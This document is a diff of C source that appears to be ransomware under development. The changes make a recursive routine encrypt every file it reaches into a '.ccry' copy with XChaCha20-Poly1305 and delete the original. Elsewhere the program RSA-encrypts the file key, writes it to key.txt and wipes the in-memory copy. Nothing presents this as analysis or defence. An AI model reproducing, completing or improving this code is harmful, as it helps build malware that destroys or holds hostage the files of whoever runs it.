@@ -92,6 +92,16 @@ static int encrypt(const char *encrypt_to, const char *source_file,
     return 0;
 }
 
+int check_extension(const char *str, const char *suffix) {
+    if (!str || !suffix)
+        return 0;
+    size_t lenstr = strlen(str);
+    size_t lensuffix = strlen(suffix);
+    if (lensuffix > lenstr)
+        return 0;
+    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
+}
+
 unsigned char enc_key[crypto_secretbox_xchacha20poly1305_KEYBYTES];
 void encryptRecursively(char *basePath) {
     char path[1000];
@@ -99,28 +109,33 @@ void encryptRecursively(char *basePath) {
     DIR *dir = opendir(basePath);
 
     // Unable to open directory stream
-    if (!dir)
+    if (!dir) {
+        char filename[256] = {0};
+        snprintf(filename, 255, "%s.ccry", basePath);
+
+        if (check_extension(basePath, ".ccry")) {
+            return;
+        }
+
+        printf("encrypting %s\n", basePath);
+        if (encrypt(filename, basePath, enc_key) != 0)
+            printf("Error encrypting file %s", enc_key);
+
+        // after the file has been ecrypted delete it.
+        int r = remove(basePath);
+        if (r != 0) {
+            printf("error deleting file after encryption\n");
+        }
         return;
-
-    while ((dp = readdir(dir)) != NULL) {
-        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
-            char filename[256] = {0};
-
-            strcpy(path, basePath);
-            strcat(path, "/");
-            strcat(path, dp->d_name);
-            snprintf(filename, 255, "%s/%s.ccry", root_dir_path, path);
-
-            if (encrypt(filename, path, enc_key) != 0)
-                printf("Error encrypting file %s", enc_key);
-
-            // after the file has been ecrypted delete it.
-            int r = remove(path);
-            if (r != 0) {
-                printf("error deleting file after encryption\n");
+    } else {
+        while ((dp = readdir(dir)) != NULL) {
+            if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
+                char filename[256] = {0};
+                strcpy(path, basePath);
+                strcat(path, "/");
+                strcat(path, dp->d_name);
+                encryptRecursively(path);
             }
-
-            encryptRecursively(path);
         }
     }
 
@@ -155,13 +170,10 @@ int main(void) {
         return 1;
     }
 
-    sodium_memzero(&encrypted_key, crypto_secretbox_xchacha20poly1305_KEYBYTES);
+    sodium_memzero(&enc_key, crypto_secretbox_xchacha20poly1305_KEYBYTES);
     FILE *out = fopen("./key.txt", "w");
     fwrite(encrypted_key, sizeof(*encrypted_key), RSA_size(rsa), out);
     fclose(out);
     free(encrypted_key);
-
-    printf("key length: %d\n", len);
-
     return EXIT_SUCCESS;
 }
